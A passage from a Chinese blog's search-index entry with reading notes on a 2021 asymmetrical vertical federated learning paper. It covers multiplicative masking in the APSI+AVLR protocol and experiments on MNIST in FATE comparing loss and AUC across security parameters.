style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">ij</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></span></p><p>即是逐元素添加模乘的掩码。由于明文运算的需要，这里<strong>只能添加模乘掩码</strong>，不能添加模加掩码，掩码的本质是一次一密，模加和模乘都可以，但这里计算输出时是需要消除掩码的，为了消除模乘的掩码，操作需要在域上进行操作（不能仅仅是环）。</p><h1 id="Experiments">Experiments</h1><p>实验将验证<code>APSI+AVLR</code>协议的可行性，并与对称型协议进行对比。</p><h2 id="Settings">Settings</h2><ul><li><p>框架：FATE</p></li><li><p>硬件：两方都使用4核心，16 GB RAM的腾讯云服务器</p></li><li><p>数据集：MNIST——60000个样本，每个样本784个特征（输入的像素）</p><p>处理方式：手工为每一个样本分配一个ID，划分和分配的规则如下表所示：</p><p><img src="/2022/07/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2021-Asymmetrical-Vertical-Federated-Learning-%E7%AC%94%E8%AE%B0/image-20220718125443368.png" alt></p></li></ul><p>联邦训练将会在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 共有的10000个样本上进行（因此，预计训练性能不如其他将整个数据集作为输入的算法，但不影响验证和比较）。</p><h2 id="Numerical-Results">Numerical Results</h2><p>超参数设置：学习率 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>η</mi><mo>=</mo><mn>0.15</mn></mrow><annotation encoding="application/x-tex">\eta=0.15</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">η</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0.15</span></span></span></span>，迭代次数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>=</mo><mn>150</mn></mrow><annotation encoding="application/x-tex">=150</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3669em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">150</span></span></span></span></p><p>不断增加安全数（security numbers），即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>λ</mi><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mtext> </mtext><mn>0.25</mn><mo separator="true">,</mo><mtext> </mtext><mn>0.5</mn><mo separator="true">,</mo><mtext> </mtext><mn>0.75</mn><mo separator="true">,</mo><mtext> </mtext><mn>1</mn></mrow><annotation encoding="application/x-tex">\lambda=0,\ 0.25,\ 0.5,\ 0.75,\ 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">λ</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0.25</span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0.5</span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0.75</span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span></span></span></span> 分别进行测试，记录各种情况下训练的损失和AUC，并绘制出模糊轨迹图：</p><p><img src="/2022/07/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2021-Asymmetrical-Vertical-Federated-Learning-%E7%AC%94%E8%AE%B0/image-20220718130543639.png" alt></p><p>由图5可见，训练的损失不随安全数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>λ</mi></mrow><annotation encoding="application/x-tex">\lambda</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">λ</span></span></span></span> 变化而变化。注意：<strong><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>λ</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\lambda=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">λ</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 对应的对称型 和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>λ</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\lambda= 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">λ</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>对应的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="script">I</mi><mrow><mi>o</mi><mi>b</mi><mi>f</mi></mrow></msup><mo>=</mo><msubsup><mi mathvariant="script">I</mi><mi>i</mi><mi>o</mi></msubsup></mrow><annotation encoding="application/x-tex">\mathcal{I}^{obf}=\mathcal{I}_i^o</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.942em;vertical-align:-0.2587em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4413em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span></span></span></span></span></span></span></span></span></span> 的情况对应的训练损失表现是相同的</strong>。</p><p><img src="/2022/07/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2021-Asymmetrical-Vertical-Federated-Learning-%E7%AC%94%E8%AE%B0/image-20220718130909464.png" alt></p><p>[AUC](如何理解机器学习和统计中的AUC？ - 无涯的回答 - 知乎 <a href="https://www.zhihu.com/question/39840928/answer/241440370">https://www.zhihu.com/question/39840928/answer/241440370</a>)是一个用于评价二分类模型的模型评价指标，为ROC曲线下的图形面积。</p><p><em>（不清楚MNIST对应的并不为二分类问题，不知道为啥能用）</em></p><p>由图6可见，不同<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>λ</mi></mrow><annotation encoding="application/x-tex">\lambda</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">λ</span></span></span></span> 对应的AUC曲线的趋势相近。</p><p>实验验证：在引入数学恒等式的概念后，<code>APSI+AVLR协议</code>拥有与对称纵向联邦学习拥有相同的表现。</p>]]></content>
      
      
      <categories>
          
          <category> 论文阅读 </category>
          
          <category> 隐私保护 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 隐私计算 </tag>
            
            <tag> PSI </tag>
            
            <tag> 联邦学习 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
